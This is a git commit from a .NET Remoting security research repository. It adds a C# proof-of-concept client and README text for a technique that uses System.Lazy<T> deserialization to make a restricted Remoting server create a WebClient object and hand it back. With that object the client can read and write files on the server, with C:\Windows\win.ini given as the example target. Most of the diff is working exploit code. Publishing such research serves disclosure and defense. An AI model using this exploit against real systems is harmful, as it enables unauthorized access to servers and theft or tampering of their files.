797688eed405f359b9872d4f529e58042e37b612
Markus Wulftange <markus.wulftange@gmail.com>
2025-08-05 08:20:51 +0000

    Add RemotingClient_MBRO_Lazy demo
    The `RemotingClient_MBRO_Lazy` demo is similar to the `RemotingClient_MBRO`
    demo and causes the creation of a `MarshalByRefObject` instance on the
    server side, which gets returned as `ObjRef` for remote interaction.
    However, instead of requiring the deserialization of a `DataTable` object
    to parse XAML, it utilizes `System.Lazy<T>`, which creates an instance
    of the given type parameter `T` on serialization, which is retrievable
    by the client in the server's response.

--- README.md
+++ README.md
@@ -3,7 +3,8 @@
 This repository provides further details and resources on the [CODE WHITE blog post of the same name *Teaching the Old .NET Remoting New Exploitation Tricks*](https://code-white.com/blog/teaching-the-old-net-remoting-new-exploitation-tricks/):
 
 - `RemotingServer`: a restricted .NET Remoting server
-- `RemotingClient_MBRO`: a client that creates a `MarshalByRefObject` on the server
+- `RemotingClient_MBRO`: a client that creates a `MarshalByRefObject` on the server using a XAML gadget
+- `RemotingClient_MBRO_Lazy`: a client that creates a `MarshalByrefObject` on the server using `Lazy<T>`
 - `RemotingClient_MBVO`: a client that sends a serializable `MarshalByRefObject` *by value*
 
 
@@ -18,7 +19,14 @@ A .NET Remoting server with restrictive configuration:
 
 ## `RemotingClient_MBRO`
 
-A client that implements the trick of creating a `MarshalByRefObject` on the server side and coercing the server to serialize it.
+A client that implements the trick of creating a `MarshalByRefObject` on the server side and coercing the server to serialize it. This requires the deserialization of a `DataTable` class that results in arbitrary XAML parsing, which creates the `MarshalByRefObject` instance and throws it in an exception retrievable from the response.
+
+It creates a [`WebClient`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=netframework-4.8.1) that can remotely read and write files on the server.
+
+
+## `RemotingClient_MBRO_Lazy`
+
+A client that implements the trick of creating a `MarshalByRefObject` on the server side and coercing the server to serialize it. Opposed to the `RemotingClient_MBRO` above, it only requires the deserialization of a [`System.Lazy<T>`](https://learn.microsoft.com/en-us/dotnet/api/system.lazy-1?view=netframework-4.8.1) object, which creates an instance of the specified type argument `T` during serialization.
 
 It creates a [`WebClient`](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=netframework-4.8.1) that can remotely read and write files on the server.
 
---
+++ RemotingClient_MBRO_Lazy/Program.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using System.Net;
+using System.Runtime.Remoting;
+using System.IO;
+using System.Reflection;
+using System.Collections.Generic;
+using System.Runtime.Remoting.Messaging;
+using CodeWhite.Remoting.Shared;
+
+namespace CodeWhite.Remoting.RemotingClient_MBRO_Lazy
+{
+    internal class Program
+    {
+        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;
+
+        static void Main(string[] args)
+        {
+            if (args.Length != 2)
+            {
+                Console.Error.WriteLine($"usage: {Path.GetFileName(ASSEMBLY_LOCATION)} objUrl fileUrl");
+                Console.Error.WriteLine();
+                Console.Error.WriteLine("example:");
+                Console.Error.WriteLine($@"  {Path.GetFileName(ASSEMBLY_LOCATION)} tcp://127.0.0.1:12345/DummyService C:\Windows\win.ini");
+                Environment.Exit(-1);
+            }
+
+            Uri objUrl = new Uri(args[0]);
+            Uri fileUrl = new Uri(args[1]);
+
+            RemotingConfiguration.Configure($"{Assembly.GetExecutingAssembly().Location}.config");
+
+            // retrieve remote WebClient
+            var mbro = GetRemoteMarshalByRefObjectInstance<WebClient>(objUrl);
+
+            // print info
+            Utils.PrintInfo(mbro);
+
+            // use remote `WebClient`
+            WebClient remoteWebClient = (WebClient)mbro;
+            Console.WriteLine(remoteWebClient.DownloadString(fileUrl));
+        }
+
+        private static T GetRemoteMarshalByRefObjectInstance<T>(Uri objUrl) where T : MarshalByRefObject
+        {
+            const string key = "MBRO";
+            var payload = new UniversalMarshal("mscorlib", typeof(Lazy<T>).FullName);
+            var logicalCallContextData = new Dictionary<string, object>()
+            {
+                { key, payload }
+            };
+            var methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);
+            var lazy = (Lazy<T>)methodReturnMessage.LogicalCallContext.GetData(key);
+            return (T)lazy.GetType().GetProperty("Value").GetValue(lazy, null);
+        }
+    }
+}
